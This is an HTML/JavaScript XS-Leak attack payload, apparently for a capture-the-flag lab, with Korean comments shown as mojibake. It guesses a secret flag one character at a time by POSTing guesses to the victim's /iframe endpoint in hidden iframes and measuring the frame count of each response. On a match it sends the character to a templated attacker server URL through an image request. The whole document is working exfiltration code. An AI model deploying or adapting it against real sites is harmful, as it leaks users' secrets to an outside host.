<script>
  const fl = "{{ flag }}";
  const leakUrl = "{{ url }}"; // ê³µê²©ì ì„œë²„ì—ì„œ ë°›ëŠ” ì—”ë“œí¬ì¸íŠ¸

  const charset = [
    'a','b','c','d','e','f','g','h','i','j','k','l','m',
    'n','o','p','q','r','s','t','u','v','w','x','y','z','}'
  ];

  charset.forEach((chr) => {
    // 1) iframe ìƒì„± + ì´ë¦„ ë¶€ì—¬
    const iframe = document.createElement("iframe");
    const frameName = "probe_" + chr; // ê° ë¬¸ìë³„ ê³ ìœ  ì´ë¦„
    iframe.name = frameName;
    document.body.appendChild(iframe);

    // 2) onload í•¸ë“¤ëŸ¬: ì‘ë‹µì´ ë¡œë“œëœ ë’¤ frameCount ì¸¡ì •
    iframe.onload = () => {
      let frameCount;

      try {
        // ê°™ì€ ì˜¤ë¦¬ì§„ì´ë¼ê³  ê°€ì • (XS-Leak ì‹¤ìŠµ í™˜ê²½)
        frameCount = iframe.contentWindow.length; // = iframe.contentWindow.frames.length
      } catch (e) {
        cleanup();
        return;
      }

      // ğŸ”¹ í”„ë ˆì„ ìˆ˜ê°€ 1 ì´ìƒì´ë©´ ê³µê²©ì ì„œë²„ë¡œ ë¬¸ì ì „ì†¡
      if (frameCount >= 1) {
        const img = new Image();
        img.src = leakUrl + `?flag=${encodeURIComponent(chr)}`;
      }

      cleanup();
    };

    // 3) POSTìš© form ìƒì„±
    const form = document.createElement("form");
    form.method = "POST";
    form.action = "/iframe";      // í”¼í•´ì ì„œë²„ì˜ /iframe (POST ë°›ëŠ” ì—”ë“œí¬ì¸íŠ¸)
    form.target = frameName;      // ì´ í¼ì˜ ì‘ë‹µì„ ìœ„ì—ì„œ ë§Œë“  iframeìœ¼ë¡œ ë¡œë“œ

    // 4) query íŒŒë¼ë¯¸í„° ì…ë ¥ê°’ (hidden input)
    const input = document.createElement("input");
    input.type = "hidden";
    input.name = "query";         // ì„œë²„ì—ì„œ request.form.get("query") ë¡œ ë°›ëŠ” ì´ë¦„
    input.value = fl + chr;       // í•„í„°ë§í•  ë¬¸ìì—´ (ë¸Œë¼ìš°ì €ê°€ ì•Œì•„ì„œ url-encodeí•¨)

    form.appendChild(input);
    document.body.appendChild(form);

    // 5) í¼ ì œì¶œ â†’ iframeìœ¼ë¡œ POST ìš”ì²­ ì „ì†¡
    form.submit();

    // 6) ì •ë¦¬ í•¨ìˆ˜
    function cleanup() {
      try {
        document.body.removeChild(iframe);
      } catch (e) {}
      try {
        document.body.removeChild(form);
      } catch (e) {}
    }
  });
</script>
